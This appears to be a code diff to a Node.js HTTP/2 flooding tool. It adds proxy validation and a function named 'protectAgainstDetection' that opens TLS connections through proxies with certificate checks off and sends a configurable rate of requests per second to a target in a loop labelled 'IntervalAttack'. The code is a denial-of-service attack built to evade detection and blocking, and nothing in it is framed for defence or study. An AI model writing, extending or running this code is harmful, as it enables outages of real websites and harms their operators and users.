@@ -55,7 +55,7 @@ const secureContextOptions = {
 const secureContext = tls.createSecureContext(secureContextOptions);
 
 let proxyFile = "proxies.txt";  // Proxies file
-let proxies = readLines(proxyFile);
+let proxies = checkProxies(readLines(proxyFile));
 let userAgents = readLines("ua.txt");
 
 const args = {
@@ -252,6 +252,79 @@ function checkProxies(proxyList) {
     });
 
     return validProxies;
+}
+
+function protectAgainstDetection(proxyOptions, callback) {
+    // Implement detection protection logic here
+    console.log("Implementing Detection Protection...");
+    Socker.HTTP(proxyOptions, (connection, error) => {
+        if (error) {
+            console.error(`Proxy Error: ${error}`);
+            return;
+        }
+
+        connection.setKeepAlive(true, 60000);
+        connection.setNoDelay(true);
+
+        const tlsOptions = {
+            port: 443,
+            secure: true,
+            ALPNProtocols: ["h2"],
+            ciphers: ciphers,
+            sigalgs: sigalgs,
+            requestCert: true,
+            socket: connection,
+            ecdhCurve: ecdhCurve,
+            honorCipherOrder: false,
+            host: parsedTarget.host,
+            rejectUnauthorized: false,
+            clientCertEngine: "dynamic",
+            secureOptions: secureOptions,
+            secureContext: secureContext,
+            servername: parsedTarget.host,
+            secureProtocol: secureProtocol
+        };
+
+        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
+
+        tlsConn.allowHalfOpen = true;
+        tlsConn.setNoDelay(true);
+        tlsConn.setKeepAlive(true, 60000);
+
+        const client = http2.connect(parsedTarget.href, {
+            protocol: "https:",
+            settings: { enablePush: false, initialWindowSize: 1073741823 },
+            createConnection: () => tlsConn
+        });
+
+        client.setMaxListeners(0);
+
+        client.on("connect", () => {
+            console.log(`[INFO] Connected to ${parsedTarget.href}`);
+            const IntervalAttack = setInterval(() => {
+                for (let i = 0; i < args.Rate; i++) {
+                    headers["referer"] = "https://" + parsedTarget.host + parsedTarget.path;
+                    const request = client.request(headers).on("response", response => {
+                        console.log(`[INFO] Response: ${response.statusCode} ${response.statusMessage}`);
+                    });
+
+                    request.end();
+                }
+            }, 1000);
+        });
+
+        client.on("close", () => {
+            console.log(`[INFO] Connection closed.`);
+            client.destroy();
+            connection.destroy();
+        });
+
+        client.on("error", error => {
+            console.error(`Connection Error: ${error}`);
+            client.destroy();
+            connection.destroy();
+        });
+    });
 }
 
 const KillScript = () => process.exit(1);
